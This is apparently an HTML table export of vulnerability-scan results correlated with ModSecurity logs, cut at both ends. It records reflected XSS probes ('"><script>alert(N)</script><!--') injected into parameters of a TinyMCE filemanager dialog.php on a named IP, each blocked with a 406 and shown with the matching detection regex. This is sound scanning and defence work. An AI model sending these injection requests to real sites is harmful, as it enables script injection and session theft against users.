&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;5519719cba727</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&quot;&gt;&lt;script&gt;alert(615699)&lt;/script&gt;&lt;!--&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;5519719cba727=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=sk9en71qr705iv0a0jeumi06q6
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:17:05</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:17:04 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(615699)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqOKwQAW0AAD9hYF4AAAAC&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqOKwQAW0AAD9hYF4AAAAC</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358370</td><td class=xl24 width=64 >2015-03-31 00:51:03</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;5519719761e63</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=&quot;&gt;&lt;script&gt;alert(268599)&lt;/script&gt;&lt;!--&amp;5519719761e63=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%22%3Ealert%28268599%29%2F; PHPSESSID=2501a51g6lmr3ruo05761c8t45
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:17:06</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:17:05 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(268599)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqOawQAW0AABvT9@8AAAAL&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqOawQAW0AABvT9@8AAAAL</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358371</td><td class=xl24 width=64 >2015-03-31 00:53:27</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;5519719c7e660</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type='&gt;&lt;script&gt;alert(337499)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;5519719c7e660=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=b3vok9k79b7iucdi0p9ne4lfb1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:17:07</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:17:06 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(337499)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqOqwQAW0AABqr3CYAAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqOqwQAW0AABqr3CYAAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358372</td><td class=xl24 width=64 >2015-03-31 00:54:34</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;5519719761e63</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >5519719761e63</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;5519719761e63=&quot;&gt;&lt;script&gt;alert(816299)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=qo7u79kuf6p5cf9amnh6up4gj5
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:17:09</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:17:07 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:5519719761e63. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(816299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqO6wQAW0AABrkSY0AAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqO6wQAW0AABrkSY0AAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358373</td><td class=xl24 width=64 >2015-03-31 00:55:45</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;5519719cba727</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_url</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url='&gt;&lt;script&gt;alert(549899)&lt;/script&gt;&lt;!--&amp;akey=key&amp;fldr=/&amp;5519719cba727=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=0fvp42hjhoe8bidpd1s3dapua6
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:17:10</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:17:09 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_url. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(549899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqPawQAW0AABtTHQ4AAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqPawQAW0AABtTHQ4AAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358374</td><td class=xl24 width=64 >2015-03-31 00:58:40</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;5519719c7e660</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang='&gt;&lt;script&gt;alert(763699)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;5519719c7e660=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=9f9jghrpmq4nc3fdbi1ghjfio5
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:17:11</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:17:10 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(763699)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqPqwQAW0AAB7zKE0AAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqPqwQAW0AAB7zKE0AAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358375</td><td class=xl24 width=64 >2015-03-31 01:00:05</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;5519719cba727</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=&quot;&gt;&lt;script&gt;alert(612199)&lt;/script&gt;&lt;!--&amp;fldr=/&amp;5519719cba727=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=hscfn1636q5t8j6top0j39mqs7
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:17:13</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:17:11 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(612199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqP6wQAW0AABt@bN0AAAAB&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqP6wQAW0AABt@bN0AAAAB</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358376</td><td class=xl24 width=64 >2015-03-31 01:02:06</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;5519719c7e660</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&quot;&gt;&lt;script&gt;alert(447799)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;5519719c7e660=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=kdj3ab56lsqqrrat90vqj5dqa6
Connection: Close

